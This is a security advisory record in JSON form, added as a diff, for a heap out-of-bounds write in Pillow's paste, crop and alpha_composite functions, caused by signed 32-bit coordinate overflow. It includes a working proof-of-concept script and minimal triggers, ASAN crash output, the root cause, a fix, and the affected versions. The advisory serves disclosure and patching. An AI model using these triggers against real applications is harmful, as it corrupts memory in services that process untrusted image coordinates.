@@ -1,0 +1,175 @@
+{
+  "id": "GHSA-6r8x-57c9-28j4",
+  "modified": "2026-07-20T23:15:24.517294664Z",
+  "published": "2026-07-20T23:09:53Z",
+  "aliases": [
+    "BIT-pillow-2026-59199",
+    "CVE-2026-59199",
+    "PYSEC-2026-3451"
+  ],
+  "summary": "Pillow: Heap out-of-bounds write `Image.paste()` / `Image.crop()` via signed coordinate overflow",
+  "details": "### Summary\n\nPillow's public image coordinate APIs can trigger a native heap out-of-bounds\nwrite when given coordinates near the signed 32-bit integer limits. In 4-byte\npixel modes such as `RGBA`, this becomes a controlled backward heap underwrite:\nfor a source image of width `W`, Pillow writes `4 * W` attacker-controlled bytes\nstarting `4 * W` bytes before the destination row pointer. With successful large\nimage allocation, the theoretical upper bound is ~2 GiB backwards from\nthe destination row.\n\nMinimal public API trigger:\n\n```python\nfrom PIL import Image\n\nINT_MIN = -(1 \u003c\u003c 31)\n\nsrc = Image.new(\"RGBA\", (2, 1), (0x41, 0x42, 0x43, 0x44))\ndst = Image.new(\"RGBA\", (8, 1))\ndst.paste(src, ((1 \u003c\u003c 31) - 2, 0, INT_MIN, 1))\n```\n\nThe same root cause is also reachable through `Image.crop()` and\n`Image.alpha_composite()`. No private API, ctypes, custom Python object, or\nmalformed image file is needed.\n\nThis has been confirmed as an ASAN heap-buffer-overflow write. On normal\nnon-ASAN Pillow builds, the minimal trigger corrupts the heap and aborts with\n`double free or corruption (out)`\n\n### Details\n\n`src/PIL/Image.py:paste()` accepts a 4-tuple box and passes it to the native\n`ImagingCore.paste()` method:\n\n```python\nself.im.paste(source, box)\n```\n\n`src/_imaging.c:_paste()` parses the four Python coordinates into signed `int`\nvalues and calls `ImagingPaste()`:\n\n```c\nint x0, y0, x1, y1;\nPyArg_ParseTuple(args, \"O(iiii)|O!\", \u0026source, \u0026x0, \u0026y0, \u0026x1, \u0026y1, ...);\nstatus = ImagingPaste(self-\u003eimage, PyImaging_AsImaging(source), ..., x0, y0, x1, y1);\n```\n\n`src/libImaging/Paste.c:ImagingPaste()` computes and clips the region using\nsigned `int` arithmetic:\n\n```c\nxsize = dx1 - dx0;\nysize = dy1 - dy0;\n\nif (dx0 + xsize \u003e imOut-\u003exsize) {\n    xsize = imOut-\u003exsize - dx0;\n}\n```\n\nWith `dx0 = 2147483646` and `dx1 = -2147483648`, `dx1 - dx0` wraps to `2`.\nThat matches the 2-pixel source image, so the size check passes. The later\n`dx0 + xsize` clip check wraps around and does not reject the out-of-bounds\ndestination.\n\nFor 4-byte pixel modes such as `RGBA`, the paste loop then multiplies `dx` by\n`pixelsize`:\n\n```c\ndx *= pixelsize;\nxsize *= pixelsize;\nmemcpy(imOut-\u003eimage[y + dy] + dx, imIn-\u003eimage[y + sy] + sx, xsize);\n```\n\nFor the minimal PoC, this writes 8 attacker-controlled bytes 8 bytes before the\ndestination row allocation.\n\nThe primitive scales with the attacker-controlled source width:\n\n```text\nsource width = W\nbox = ((1 \u003c\u003c 31) - W, 0, INT_MIN, 1)\n\nC destination offset = -4 * W\nC memcpy size        =  4 * W\nwrite range          = [row_start - 4W, row_start)\n```\n\nExamples for `RGBA`:\n\n```text\nW = 2         -\u003e writes 8 bytes before the row\nW = 1024      -\u003e writes 4096 bytes before the row\nW = 65536     -\u003e writes 256 KiB before the row\nW = 1000000   -\u003e writes about 4 MiB before the row\n```\n\nPillow's image creation guard currently limits `xsize` to roughly\n`INT_MAX / 4 - 1`, so the theoretical upper bound for this `RGBA` underwrite is\n`2,147,483,640` bytes before the destination row pointer. In practice, the\nusable range depends on memory availability, allocator layout, and process heap\nstate.\n\nTwo other documented APIs reach the same sink:\n\n```python\n# Image.crop() path\nleft = INT_MIN + 2\nImage.new(\"RGBA\", (2, 1)).crop((left, 0, left + 2, 1))\n\n# Image.alpha_composite() path, via its internal crop()\nbase = Image.new(\"RGBA\", (2, 1))\nover = Image.new(\"RGBA\", (2, 1), (0x41, 0x42, 0x43, 0x44))\nbase.alpha_composite(over, dest=(left, 0))\n```\n\n`Image.crop()` keeps `right - left` small, so the Python decompression-bomb\ncheck allows it. `src/libImaging/Crop.c` then computes wrapped paste\ncoordinates and calls `ImagingPaste()`.\n\n### PoC\n\nThe following standalone script exercises all three public API paths. Save it\nas `b021_poc.py` and run it with `paste`, `crop`, or `alpha`.\n\n```python\n#!/usr/bin/env python3\nimport argparse\nimport sys\n\nfrom PIL import Image\n\n\nINT_MIN = -(1 \u003c\u003c 31)\n\n\ndef rgba_pattern(width):\n    out = bytearray()\n    for i in range(width):\n        out += bytes((0x41 + (i % 26), 0x42, 0x43, 0x44))\n    return bytes(out)\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"variant\",\n        choices=(\"paste\", \"crop\", \"alpha\"),\n        nargs=\"?\",\n        default=\"paste\",\n    )\n    parser.add_argument(\"-w\", \"--width\", type=int, default=2)\n    args = parser.parse_args()\n\n    width = args.width\n    src = Image.frombytes(\"RGBA\", (width, 1), rgba_pattern(width))\n\n    if args.variant == \"paste\":\n        box = ((1 \u003c\u003c 31) - width, 0, INT_MIN, 1)\n        dst = Image.new(\"RGBA\", (max(8, width), 1), (0, 0, 0, 0))\n        print(f\"variant=paste box={box}\")\n        print(f\"expected C dst offset={-4 * width}, write_size={4 * width}\")\n        sys.stdout.flush()\n        dst.paste(src, box)\n        print(\"paste returned; first row:\", dst.tobytes().hex())\n\n    elif args.variant == \"crop\":\n        left = INT_MIN + width\n        box = (left, 0, left + width, 1)\n        print(f\"variant=crop box={box}\")\n        sys.stdout.flush()\n        out = src.crop(box)\n        print(\"crop returned; output:\", out.tobytes().hex())\n\n    else:\n        dest = (INT_MIN + width, 0)\n        dst = Image.new(\"RGBA\", (max(8, width), 1), (0, 0, 0, 0))\n        print(f\"variant=alpha dest={dest}\")\n        sys.stdout.flush()\n        dst.alpha_composite(src, dest=dest)\n        print(\"alpha_composite returned; first row:\", dst.tobytes().hex())\n\n    sys.stdout.flush()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nRun against an ASAN build:\n\n```bash\nenv ASAN_OPTIONS=detect_leaks=0 ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer \\\n  python b021_poc.py paste\n\nenv ASAN_OPTIONS=detect_leaks=0 ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer \\\n  python b021_poc.py crop\n\nenv ASAN_OPTIONS=detect_leaks=0 ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer \\\n  python b021_poc.py alpha\n```\n\nObserved ASAN signature for the direct `Image.paste()` path:\n\n```text\nERROR: AddressSanitizer: heap-buffer-overflow\nWRITE of size 8\npaste /out/src/src/libImaging/Paste.c:59\nImagingPaste /out/src/src/libImaging/Paste.c:323\n_paste /out/src/src/_imaging.c:1461\n0x... is located 8 bytes before 32-byte region\n```\n\nOn non-ASAN Pillow `12.2.0` and local `12.3.0.dev0`, the direct minimal\n`Image.paste()` trigger returns from `paste()` and then the process aborts\nduring cleanup with:\n\n```text\ndouble free or corruption (out)\nAborted (core dumped)\n```\n\nObserved ASAN signature for the `Image.crop()` and `Image.alpha_composite()`\npaths:\n\n```text\nERROR: AddressSanitizer: heap-buffer-overflow\nWRITE of size 8\npaste /out/src/src/libImaging/Paste.c:59\nImagingPaste /out/src/src/libImaging/Paste.c:323\nImagingCrop /out/src/src/libImaging/Crop.c:57\n_crop /out/src/src/_imaging.c:1090\n```\n## Suggested fix\n\nAvoid signed overflow in paste/crop coordinate arithmetic. Use checked\narithmetic or a wider type before calculating widths and clipped endpoints.\n\nFor example, reject boxes whose endpoint subtraction cannot be represented\ncleanly, and clip using non-overflowing comparisons:\n\n```c\nint64_t xsize64 = (int64_t)dx1 - dx0;\nint64_t ysize64 = (int64_t)dy1 - dy0;\n\nif (xsize64 \u003c 0 || ysize64 \u003c 0 || xsize64 \u003e INT_MAX || ysize64 \u003e INT_MAX) {\n    return ImagingError_ValueError(\"bad box\");\n}\n```\n\n`ImagingCrop()` should receive the same treatment for `sx1 - sx0`,\n`dx0 = -sx0`, and `dx1 = imIn-\u003exsize - sx0`.\n\n### Impact\n\nThis is a heap out-of-bounds write in Pillow's native C extension, reachable\nthrough documented public image APIs.\n\nApplications are impacted if an untrusted user can control image operation\ncoordinates passed to Pillow, for example crop boxes, paste boxes, or overlay\npositions. The bytes written in the direct `Image.paste()` variant are copied\nfrom the source image, so attacker-controlled source pixels can influence the\nout-of-bounds write. For `RGBA`, the write is a backward heap underwrite whose\noffset and length are both `4 * source_width`, bounded in practice by successful\nimage allocation and heap layout.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "12.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "1.7.8",
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-6r8x-57c9-28j4/GHSA-6r8x-57c9-28j4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-6r8x-57c9-28j4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59199"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/pull/9703"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/ceefc348eb3c3844c7f9796ef2cc3a7dd5fbba7b"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3451.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/12.3.0"
+    }
+  ]
+}
